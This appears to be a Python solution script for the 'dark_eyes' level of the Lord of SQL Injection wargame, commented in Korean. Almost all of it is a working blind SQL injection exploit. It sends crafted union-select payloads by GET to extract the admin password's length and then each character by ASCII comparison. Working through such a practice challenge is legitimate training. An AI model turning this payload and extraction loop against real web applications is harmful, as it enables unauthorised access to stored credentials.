#LOS dark_eyes


import requests

url ="https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php?" #공격URL
cookies ={"PHPSESSID": ""} #쿠키값

#패스워드 길이 찾기
def pw_len():
    len_num = 0

    while 1 :
        len_num = len_num + 1
        value = "' or id = 'admin' and (select 1 union select length(pw)={})#".format(len_num) #injection payload
        parmas = {'pw': value}      #url에 GET으로 전달하는 파라미터
        response = requests.get(url,params=parmas, cookies=cookies)
        print(value)


        if "query" in response.text:    #응답값에 Hello admin이 있으면 반환
            print("password length : ", len_num)
            break
    return len_num

def pw_real(len_num):
    pw=''
    for i in range(1,len_num+1):
        print(i,"번째 검색 중")

        for j in range(48, 122):  #아스키코드값 48번부터 122번
 
        
            value = "' or id = 'admin' and (select 1 union select ascii(substr(pw,{},1))={})#".format(i,j) #injection payload
            parmas = {'pw':value}
            response = requests.get(url, params=parmas, cookies=cookies)
            print(j)

            if "query" in response.text:       #응답값에 Hello admin이 있으면 반환
                pw = pw + chr(j)    #chr(): 아스키코드값 -> 문자
                print("password  : ", pw)
                break
    return pw

pw_real(pw_len())
